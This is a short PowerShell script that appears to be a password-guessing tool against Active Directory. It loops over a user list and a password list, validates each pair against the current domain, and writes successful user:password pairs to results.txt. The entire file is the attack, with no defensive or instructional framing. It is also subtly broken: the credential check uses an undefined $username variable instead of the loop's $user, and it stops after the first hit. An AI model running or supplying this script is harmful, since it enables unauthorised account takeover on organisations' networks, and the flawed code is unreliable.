$UserDomain = $env:USERDOMAIN
Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
$ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
$PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)
$UserFile = "./users.txt"
$PassFile = "./passwords.txt"
$NewLine = "`r`n"
$UserCount = (Get-Content $UserFile).Length
$LineCounter = 0

:UserLoop foreach($user in Get-Content $UserFile) {
    $LineCounter ++
    Write-Output "[*] Checking user: $LineCounter out of $UserCount"
    foreach($password in Get-Content $PassFile) {
            $success = $principalContext.ValidateCredentials($username, $password)
            Write-Output $success
            if ($success -eq $True)
            {
                $UserInfo = "$user : $password"
                Write-Output "[!] Password found: $UserInfo"
                Add-Content .\results.txt "$UserInfo $NewLine"
                break UserLoop
            }
}
}
